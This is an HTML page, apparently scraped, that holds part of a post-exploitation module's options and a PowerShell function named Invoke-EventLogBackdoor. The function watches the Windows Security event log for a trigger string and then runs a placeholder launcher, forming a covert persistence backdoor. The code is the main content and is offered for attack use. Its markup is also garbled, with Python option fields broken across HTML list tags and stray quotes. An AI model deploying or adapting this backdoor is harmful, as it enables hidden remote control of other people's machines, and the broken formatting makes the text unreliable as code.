<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>EventLog RDP</title>
</head><body>Starts the event-loop backdoor<br/>
      'Trigger' : {<br/>
        'Description'  :  'The unique value to look for in every event packet.',<br/>
        'Required'   :  True,<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">'Value' : 'HACKER'</li>
</ul>
</li>
</ul>
OutFile' : {<br/>
        'Description'  :  'Output the backdoor to a file instead of tasking to an agent.',<br/>
        'Required'   :  False,<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">'Value' 		: ''</li>
<li style="list-style-type: none"/>
<li style="list-style-type: none">function Invoke-EventLogBackdoor</li>
<li style="list-style-type: none">{</li>
<li style="list-style-type: none">  Param(</li>
<li style="list-style-type: none">  [Parameter(Mandatory=$False,Position=1)]  </li>
<li style="list-style-type: none">  [string]$Trigger=&quot;HACKER&quot;, </li>
<li style="list-style-type: none">  [Parameter(Mandatory=$False,Position=2)]</li>
<li style="list-style-type: none">  [int]$Timeout=0,</li>
<li style="list-style-type: none">  [Parameter(Mandatory=$False,Position=3)]</li>
<li style="list-style-type: none">  [int]$Sleep=30</li>
<li style="list-style-type: none">  )</li>
<li style="list-style-type: none">  $running=$True</li>
<li style="list-style-type: none">  $match =&quot;&quot;</li>
<li style="list-style-type: none">  $starttime = Get-Date</li>
<li style="list-style-type: none">  while($running)</li>
<li style="list-style-type: none">  {</li>
<li style="list-style-type: none">    if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))</li>
<li style="list-style-type: none">    {</li>
<li style="list-style-type: none">      $running=$False</li>
<li style="list-style-type: none">    }</li>
<li style="list-style-type: none">    $d = Get-Date</li>
<li style="list-style-type: none">    $NewEvents = Get-WinEvent -FilterHashtable @{logname='Security'; StartTime=$d.AddSeconds(-$Sleep)} -ErrorAction SilentlyContinue | fl Message | Out-String</li>
<li style="list-style-type: none">    </li>
<li style="list-style-type: none">    if($NewEvents -match $Trigger)</li>
<li style="list-style-type: none">    {</li>
<li style="list-style-type: none">      REPLACE_LAUNCHER</li>
<li style="list-style-type: none">      $running=$False</li>
<li style="list-style-type: none">    }</li>
<li style="list-style-type: none">    else</li>
<li style="list-style-type: none">    {</li>
<li style="list-style-type: none">      Start-Sleep -s $Sleep</li>
<li style="list-style-type: none">    }</li>
<li style="list-style-type: none">  }</li>
<li style="list-style-type: none">}</li>
<li style="list-style-type: none">Invoke-EventLogBackdoor&quot;&quot;&quot;</li>
</ul>
</li>
</ul>
</body></html>